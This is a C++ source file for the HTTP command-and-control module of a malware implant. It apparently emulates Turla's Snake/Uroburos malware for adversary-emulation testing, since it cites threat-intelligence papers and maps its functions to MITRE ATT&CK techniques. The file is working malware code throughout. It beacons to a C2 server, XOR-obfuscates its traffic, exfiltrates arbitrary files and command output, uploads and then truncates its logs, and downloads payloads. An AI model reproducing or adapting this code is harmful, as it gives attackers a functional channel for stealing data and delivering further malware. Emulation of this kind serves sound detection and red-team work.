/*
 * Handle C2 communications over HTTP
 * 
 * CTI references:
 * [1] https://artemonsecurity.com/snake_whitepaper.pdf
 * [2] https://public.gdatasoftware.com/Web/Content/INT/Blog/2014/02_2014/documents/GData_Uroburos_RedPaper_EN_v1.pdf
 */

#include <vector>
#include "comms_http.h"
#include "logging.h"
#include "enc_handler.h"
#include "util.h"

namespace fs = std::filesystem;

namespace comms_http {

std::wstring user_agent(DEFAULT_USER_AGENT);

// Helper function - Perform the specified HTTP request type for the given address
// Turla has been seen using Windows Internet (WinINet) API calls, such as HttpOpenRequest,
// HttpSendRequest, InternetReadFile, etc for its C2 communications [1].
//
// References: 
//      https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopena
//      https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetconnecta
//      https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpopenrequestw
//      https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpsendrequesta
//      https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetreadfile
std::vector<unsigned char> PerformHttpRequest(
    ApiWrapperInterface* api_wrapper, 
    LPCWSTR address, 
    WORD port, 
    LPCWSTR request_type, 
    LPCWSTR resource_path, 
    LPCWSTR additional_headers, 
    char* data, 
    DWORD data_len, 
    DWORD* p_error_code,
    DWORD* p_http_status_code
) {
    DWORD overall_result = ERROR_SUCCESS;
    std::vector<unsigned char> v_response;
    HINTERNET h_inet = HINTERNET(NULL);
    HINTERNET h_session = HINTERNET(NULL);
    HINTERNET h_request = HINTERNET(NULL);
    LPCWSTR accept_types[] = {L"*/*", NULL}; // accept any MIME type

    do {
        // initialize usage of WinInet functions
        h_inet = api_wrapper->InternetOpenWrapper(
            user_agent.c_str(),        // user agent
            INTERNET_OPEN_TYPE_DIRECT, // resolve host names locally
            NULL,                      // not using proxy servers
            NULL,                      // not using proxy servers
            0                          // no optional flags
        );
        if (h_inet == NULL) {
            overall_result = api_wrapper->GetLastErrorWrapper();
            break;
        }

        // Open HTTP session to C2 server
        h_session = api_wrapper->InternetConnectWrapper(
            h_inet,
            address,
            INTERNET_PORT(port),
            NULL,                  // not passing in username
            NULL,                  // not passing in password
            INTERNET_SERVICE_HTTP,
            0,                     // no optional flags
            (DWORD_PTR)NULL
        );
        if (h_session == NULL) {
            overall_result = api_wrapper->GetLastErrorWrapper();
            break;
        }

        // Create HTTP request handle
        h_request = api_wrapper->HttpOpenRequestWrapper(
            h_session,
            request_type,  // HTTP request type (e.g. GET or POST)
            resource_path, // path to HTTP resource (e.g. /PUB/home.html)
            NULL,          // use default HTTP version
            NULL,          // no referrer
            accept_types,
            INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE,
            (DWORD_PTR)NULL
        );
        if (h_request == NULL) {
            overall_result = api_wrapper->GetLastErrorWrapper();
            break;
        }

        // Send the HTTP request
        BOOL result = api_wrapper->HttpSendRequestWrapper(
            h_request,
            additional_headers,
            -1L,                // let function auto-calculate length
            (LPVOID)data,
            data_len
        );
        if (!result) {
            overall_result = api_wrapper->GetLastErrorWrapper();
            break;
        }

        // Get HTTP status code
        DWORD status_code_length = sizeof(DWORD);
        result = api_wrapper->HttpQueryInfoWrapper(
            h_request,
            HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
            p_http_status_code,
            &status_code_length,
            NULL
        );
        if (!result) {
            overall_result = api_wrapper->GetLastErrorWrapper();
            break;
        }

        // Read response
        char response_buffer[RESP_BUFFER_SIZE];
        DWORD num_bytes_read = 0;
        do {
            result = api_wrapper->InternetReadFileWrapper(
                h_request,
                response_buffer,
                RESP_BUFFER_SIZE,
                &num_bytes_read
            );
            if (!result) {
                overall_result = api_wrapper->GetLastErrorWrapper();
                break;
            }
            v_response.insert(v_response.end(), response_buffer, response_buffer + num_bytes_read);
        } while (num_bytes_read != 0);

        // Check if HTTP status code is 4xx or 5xx
        if (400 <= *p_http_status_code) {
            overall_result = FAIL_BAD_HTTP_STATUS_CODE;
            break;
        }
    } while (0);

    // Cleanup
    if (h_inet != NULL) api_wrapper->InternetCloseHandleWrapper(h_inet);
    if (h_session != NULL) api_wrapper->InternetCloseHandleWrapper(h_session);
    if (h_request != NULL) api_wrapper->InternetCloseHandleWrapper(h_request);
    *p_error_code = overall_result;
    return v_response;
}

// Helper function - Perform an HTTP GET request for the given address
// Returns the response and places error code in error_code
std::vector<unsigned char> PerformHttpGetRequest(
    ApiWrapperInterface* api_wrapper, 
    LPCWSTR address,
    WORD port,
    LPCWSTR resource_path, 
    DWORD* p_error_code,
    DWORD* p_http_status_code
) {
    return PerformHttpRequest(
        api_wrapper,
        address,
        port,
        L"GET",
        resource_path,
        NULL,
        NULL,
        0,
        p_error_code,
        p_http_status_code
    );
}

/*
 * PerformHeartbeat:
 *      About:
 *          Perform a heartbeat request by querying a specific file from the C2 server, expecting a response of "1" [1].
 *      Result:
 *          Returns ERROR_SUCCESS on success, otherwise some other error code.
 *      MITRE ATT&CK Techniques:
 *          T1071.001: Application Layer Protocol: Web Protocols
 *      CTI:
 *          https://artemonsecurity.com/snake_whitepaper.pdf
 */
DWORD PerformHeartbeat(
    ApiWrapperInterface* api_wrapper,
    LPCWSTR address,
    WORD port
) {
    DWORD result_code;
    std::string log_msg;
    DWORD http_status_code = HTTP_STATUS_SERVER_ERROR;
    std::vector<unsigned char> v_resp = PerformHttpGetRequest(
        api_wrapper,
        address,
        port,
        HEARTBEAT_PATH,
        &result_code,
        &http_status_code
    );
    if (result_code == ERROR_SUCCESS) {
        std::string heartbeat_response(v_resp.begin(), v_resp.end());
        if (heartbeat_response != kHeartbeatAliveResp) {
            log_msg = "Heartbeat dead. Received response: " + heartbeat_response;
            logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR, log_msg);
            return FAIL_HEARTBEAT_DEAD;
        }
        log_msg = "Heartbeat alive. Received response: " + heartbeat_response;
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_INFO, log_msg);
    } else if (result_code == FAIL_BAD_HTTP_STATUS_CODE) {
        log_msg = "Heartbeat request received non-success HTTP status code from server. Status code: " + std::to_string(http_status_code);
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR, log_msg);
    } else {
        log_msg = "Heartbeat failed. Error code: " + std::to_string(result_code);
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR, log_msg);
    }
    return result_code;
}

/*
 * PerformBeacon:
 *      About:
 *          Send a beacon to the c2 server and obtain the next instruction, if any. Communication is XOR encrypted using a hardcoded XOR key.
 *      Result:
 *          Returns ERROR_SUCCESS on success, otherwise some other error code.
 *      MITRE ATT&CK Techniques:
 *          T1071.001: Application Layer Protocol: Web Protocols
 *          T1573.001: Encrypted Channel: Symmetric Cryptography
 *      CTI:
 *          https://artemonsecurity.com/snake_whitepaper.pdf
 */
DWORD PerformBeacon(
    ApiWrapperInterface* api_wrapper, 
    LPCWSTR address, 
    WORD port, 
    std::wstring implant_id,
    instruction::Instruction* received_instruction
) {
    DWORD result_code;
    std::string log_msg;
    std::wstring full_beacon_path = std::wstring(BASE_BEACON_PATH) + implant_id;
    DWORD http_status_code = HTTP_STATUS_SERVER_ERROR;
    std::vector<unsigned char> v_resp = PerformHttpGetRequest(
        api_wrapper,
        address,
        port,
        full_beacon_path.c_str(),
        &result_code,
        &http_status_code
    );
    if (result_code == ERROR_SUCCESS) {
        // XOR-decrypt beacon response
        XorInPlace(&v_resp[0], v_resp.size());
        std::string beacon_response(v_resp.begin(), v_resp.end());
        result_code = instruction::ExtractInstructionInformation(api_wrapper, beacon_response, received_instruction);
        if (result_code != ERROR_SUCCESS) {
            log_msg = "Failed to parse beacon response. Error code: " + std::to_string(result_code);
            logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR, log_msg);
        }
    } else if (result_code == FAIL_BAD_HTTP_STATUS_CODE) {
        log_msg = "Beacon request received non-success HTTP status code from server. Status code: " + std::to_string(http_status_code);
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR, log_msg);
    } else {
        log_msg = "Beacon failed. Error code: " + std::to_string(result_code);
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR, log_msg);
    }
    return result_code;
}

// Helper function for UploadLogs
DWORD UploadAndTruncateLogWithMutex(
    ApiWrapperInterface* api_wrapper,
    LPCWSTR address, 
    WORD port, 
    LPCWSTR file_to_upload, 
    std::wstring instruction_id,
    BOOL encrypt,
    HANDLE h_mutex
) {
    DWORD result_code;
    DWORD wait_result = api_wrapper->WaitForSingleObjectWrapper(h_mutex, MUTEX_WAIT_MS);
    switch (wait_result) {
        case WAIT_OBJECT_0:
            try {
                result_code = UploadFile(
                    api_wrapper,
                    address,
                    port,
                    file_to_upload,
                    instruction_id,
                    encrypt
                );
                if (result_code == ERROR_SUCCESS) {
                    api_wrapper->TruncateFileWrapper(std::wstring(file_to_upload));
                }
            } catch (...) {
                logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR, "Failed to upload file with mutex.");
                result_code = FAIL_UPLOAD_FILE_WITH_MUTEX;
            }
            if (!api_wrapper->ReleaseMutexWrapper(h_mutex)) {
                result_code = api_wrapper->GetLastErrorWrapper();
                logging::LogMessage(
                    api_wrapper, 
                    LOG_C2,
                    LOG_LEVEL_ERROR, 
                    "Failed to release mutex. Error code: " + std::to_string(result_code)
                );
            }
            return result_code;
        case WAIT_TIMEOUT:
            logging::LogMessage(
                api_wrapper, 
                LOG_C2,
                LOG_LEVEL_ERROR, 
                "Timeout elapsed when waiting for mutex."
            );
            return FAIL_MUTEX_TIMEOUT;
        case WAIT_ABANDONED:
            logging::LogMessage(
                api_wrapper, 
                LOG_C2,
                LOG_LEVEL_ERROR, 
                "Mutex in abandoned state."
            );
            return FAIL_MUTEX_ABANDONED;
        case WAIT_FAILED:
            result_code = api_wrapper->GetLastErrorWrapper();
            logging::LogMessage(
                api_wrapper, 
                LOG_C2,
                LOG_LEVEL_ERROR, 
                "Failed to wait for mutex. Error code: " + std::to_string(result_code)
            );
            return result_code;
        default:
            return FAIL_MUTEX_WAIT_FAILED;
    }
}

/*
 * UploadFile:
 *      About:
 *          Upload a specified file to the C2 server.
 *          Communication is XOR encrypted using a hardcoded XOR key.
 *      Result:
 *          Returns ERROR_SUCCESS on success, otherwise some other error code.
 *      MITRE ATT&CK Techniques:
 *          T1071.001: Application Layer Protocol: Web Protocols
 *          T1573.001: Encrypted Channel: Symmetric Cryptography
 *          T1041: Exfiltration Over C2 Channel
 *      CTI:
 *          https://artemonsecurity.com/snake_whitepaper.pdf
 */
DWORD UploadFile(
    ApiWrapperInterface* api_wrapper,
    LPCWSTR address, 
    WORD port, 
    LPCWSTR file_to_upload, 
    std::wstring instruction_id,
    BOOL encrypt
) {
    DWORD result_code = ERROR_SUCCESS;
    std::string log_msg;
    HANDLE h_upload_file = api_wrapper->CreateFileWrapper(
        file_to_upload,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING, // only open if existing
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (h_upload_file == INVALID_HANDLE_VALUE) {
        result_code = api_wrapper->GetLastErrorWrapper();
        log_msg = "Failed to open upload file " + util::ConvertWstringToString(file_to_upload) + ". Error code: " + std::to_string(result_code);
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR, log_msg);
        return result_code;
    }

    // Get file size to make sufficient buffer
    DWORD file_size = api_wrapper->GetFileSizeWrapper(h_upload_file, NULL);
    if (file_size == INVALID_FILE_SIZE) {
        result_code = api_wrapper->GetLastErrorWrapper();
        api_wrapper->CloseHandleWrapper(h_upload_file);
        log_msg = "Failed to get file size for upload file " + util::ConvertWstringToString(file_to_upload) + ". Error code: " + std::to_string(result_code);
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR, log_msg);
        return result_code;
    } else if (file_size > MAX_FILE_UPLOAD_SIZE) {
        api_wrapper->CloseHandleWrapper(h_upload_file);
        log_msg = "Upload file " + util::ConvertWstringToString(file_to_upload) + " too large. Max supported file size: " + std::to_string(MAX_FILE_UPLOAD_SIZE);
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR, log_msg);
        return FAIL_UPLOAD_TOO_LARGE;
    }

    // Read file data.
    std::vector<char> post_buffer(file_size);
    result_code = file_handler::ReadFileBytes(api_wrapper, h_upload_file, &post_buffer[0], file_size);
    api_wrapper->CloseHandleWrapper(h_upload_file);

    if (result_code != ERROR_SUCCESS) {
        log_msg = "Failed to read upload file " + util::ConvertWstringToString(file_to_upload) + ". Error code: " + std::to_string(result_code);
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR, log_msg);
        return result_code;
    }

    // XOR-encrypt file data
    if (encrypt) {
        XorInPlace(&post_buffer[0], file_size);
    }

    // Perform POST request for upload
    std::wstring upload_url = std::wstring(BASE_OUTPUT_UPLOAD_PATH) + instruction_id;
    DWORD http_status_code = HTTP_STATUS_SERVER_ERROR;
    std::vector<unsigned char> v_resp = PerformHttpRequest(
        api_wrapper, 
        address, 
        port,
        L"POST",
        upload_url.c_str(), 
        NULL, //headers,
        &post_buffer[0], 
        file_size, // data_len,
        &result_code,
        &http_status_code
    );
    if (result_code == FAIL_BAD_HTTP_STATUS_CODE) {
        log_msg = "Received non-success HTTP status code from server. Status code: " + std::to_string(http_status_code);
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR, log_msg);
    } else if (result_code != ERROR_SUCCESS) {
        log_msg = "Failed to perform POST request for file upload. Error code: " + std::to_string(result_code);
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR, log_msg);
    } else {
        std::string post_response(v_resp.begin(), v_resp.end());
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_INFO, "Received file upload response: " + post_response);
    }
    return result_code;
}

/*
 * UploadCommandOutput:
 *      About:
 *          Send command execution output to the C2 server.
 *          Communication is XOR encrypted using a hardcoded XOR key.
 *      Result:
 *          Returns ERROR_SUCCESS on success, otherwise some other error code.
 *      MITRE ATT&CK Techniques:
 *          T1071.001: Application Layer Protocol: Web Protocols
 *          T1573.001: Encrypted Channel: Symmetric Cryptography
 *      CTI:
 *          https://artemonsecurity.com/snake_whitepaper.pdf
 */
DWORD UploadCommandOutput(
    ApiWrapperInterface* api_wrapper, 
    LPCWSTR address, 
    WORD port, 
    std::vector<char> output, 
    std::wstring instr_id
) {
    DWORD result = ERROR_SUCCESS;
    std::string log_msg;

    // Encrypt output in place (this function is the last one to handle the output anyway, so in-place modification is fine).
    if (output.size() > 0) {
        XorInPlace(&output[0], output.size());
    }

    // Perform POST request for upload
    std::wstring upload_url = std::wstring(BASE_OUTPUT_UPLOAD_PATH) + instr_id;
    DWORD http_status_code = HTTP_STATUS_SERVER_ERROR;
    std::vector<unsigned char> v_resp = PerformHttpRequest(
        api_wrapper, 
        address, 
        port,
        L"POST",
        upload_url.c_str(), 
        NULL, //headers,
        &output[0], 
        output.size(),
        &result,
        &http_status_code
    );
    if (result == FAIL_BAD_HTTP_STATUS_CODE) {
        log_msg = "Received non-success HTTP status code from server. Status code: " + std::to_string(http_status_code);
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR, log_msg);
    } else if (result != ERROR_SUCCESS) {
        log_msg = "Failed to perform POST request for command output upload. Error code: " + std::to_string(result);
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR, log_msg);
    } else {
        std::string post_response(v_resp.begin(), v_resp.end());
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_INFO, "Received output upload response: " + post_response);
    }
    return result;
}

/*
 * UploadLogs:
 *      About:
 *          Upload log files to the C2 server and clear out the logs.
 *          Communication is XOR encrypted using a hardcoded XOR key.
 *      Result:
 *          None
 *      MITRE ATT&CK Techniques:
 *          T1071.001: Application Layer Protocol: Web Protocols
 *          T1573.001: Encrypted Channel: Symmetric Cryptography
 *          T1041: Exfiltration Over C2 Channel
 *      CTI:
 *          https://artemonsecurity.com/snake_whitepaper.pdf
 */
void UploadLogs(
    ApiWrapperInterface* api_wrapper, 
    LPCWSTR address, 
    WORD port
) {
    DWORD upload_result;
    
    // Upload execution log file
    logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_DEBUG, "Uploading execution log file at " + util::ConvertWstringToString(logging::kExecutionLogFile));
    upload_result = UploadAndTruncateLogWithMutex(
        api_wrapper,
        address,
        port,
        logging::kExecutionLogFile.c_str(),
        logging::kExecutionLogId,
        FALSE, // logs are already encrypted
        logging::h_execution_log_mutex // use execution log mutex
    );
    if (upload_result == ERROR_SUCCESS) {
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_INFO, "Successfully uploaded and truncated execution log file.");
    } else {
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR, "Failed to upload and truncate execution log file. Response code: " + std::to_string(upload_result));
    }

    // Upload pipe server log file
    logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_DEBUG, "Uploading pipe server log file at " + util::ConvertWstringToString(logging::kPipeServerLogFile));
    upload_result = UploadFile(
        api_wrapper,
        address,
        port,
        logging::kPipeServerLogFile.c_str(),
        logging::kPipeServerLogId,
        FALSE // logs are already encrypted
    );
    if (upload_result == ERROR_SUCCESS) {
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_INFO, "Successfully uploaded pipe server log file.");
        api_wrapper->TruncateFileWrapper(logging::kPipeServerLogFile);
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_INFO, "Truncated pipe server log file.");
    }

    // Upload pipe client log file
    logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_DEBUG, "Uploading pipe client log file at " + util::ConvertWstringToString(logging::kPipeClientLogFile));
    upload_result = UploadAndTruncateLogWithMutex(
        api_wrapper,
        address,
        port,
        logging::kPipeClientLogFile.c_str(),
        logging::kPipeClientLogId,
        FALSE, // logs are already encrypted
        logging::h_pipe_client_log_mutex // use pipe client log mutex
    );
    if (upload_result == ERROR_SUCCESS) {
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_INFO, "Successfully uploaded and truncated pipe client log file.");
    } else {
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR, "Failed to upload and truncate pipe client log file. Response code: " + std::to_string(upload_result));
    }

    // Upload C2 log file
    logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_DEBUG, "Uploading C2 log file at " + util::ConvertWstringToString(logging::kC2LogFile));
    upload_result = UploadFile(
        api_wrapper,
        address,
        port,
        logging::kC2LogFile.c_str(),
        logging::kC2LogId,
        FALSE // logs are already encrypted
    );
    if (upload_result == ERROR_SUCCESS) {
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_INFO, "Successfully uploaded C2 log file.");
        api_wrapper->TruncateFileWrapper(logging::kC2LogFile);
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_INFO, "Truncated C2 log file.");
    }
}

/*
 * DownloadPayloadBytes:
 *      About:
 *          Download the payload for the specified instruction from the C2 server.
 *          Communication is XOR encrypted using a hardcoded XOR key.
 *      Result:
 *          Returns a char vector containing the payload bytes on success.
 *          error_code will be populated with the DWORD error code (ERROR_SUCCESS for no error).
 *      MITRE ATT&CK Techniques:
 *          T1105: Ingress Tool Transfer
 *          T1071.001: Application Layer Protocol: Web Protocols
 *          T1573.001: Encrypted Channel: Symmetric Cryptography
 *      CTI:
 *          https://artemonsecurity.com/snake_whitepaper.pdf
 */
std::vector<char> DownloadPayloadBytes(
    ApiWrapperInterface* api_wrapper, 
    LPCWSTR address, 
    WORD port,
    std::wstring instruction_id,
    DWORD* error_code
) {
    std::string log_msg;

    // perform GET request to get payload data
    std::wstring payload_request_path = std::wstring(BASE_PAYLOAD_DOWNLOAD_PATH) + instruction_id;
    DWORD http_status_code = HTTP_STATUS_SERVER_ERROR;
    std::vector<unsigned char> v_payload_data = PerformHttpGetRequest(
        api_wrapper,
        address,
        port,
        payload_request_path.c_str(),
        error_code,
        &http_status_code
    );
    if (*error_code == FAIL_BAD_HTTP_STATUS_CODE) {
        log_msg = "Payload download failed: non-success HTTP status code from server. Status code: " + std::to_string(http_status_code);
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR, log_msg);
        return std::vector<char>(0);
    } else if (*error_code != ERROR_SUCCESS) {
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR, "Payload download failed. Error code: " + std::to_string(*error_code));
        return std::vector<char>(0);
    }

    // Verify successful download
    size_t payload_size = v_payload_data.size();
    if (payload_size == 0) {
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR, "Payload download failed: Empty payload.");
        *error_code = FAIL_EMPTY_PAYLOAD_DOWNLOAD;
        return std::vector<char>(0);
    }
    log_msg = "Downloaded payload: " + std::to_string(payload_size) + " bytes";
    logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_DEBUG, log_msg);

    // Decrypt payload data
    XorInPlace(&v_payload_data[0], payload_size);

    *error_code = ERROR_SUCCESS;
    return std::vector<char>(v_payload_data.begin(), v_payload_data.end());
}

void UpdateUserAgent(std::wstring new_agent_str) {
    if (new_agent_str.length() > 0) {
        user_agent = std::wstring(new_agent_str);
    }
}

} // namespace comms_http
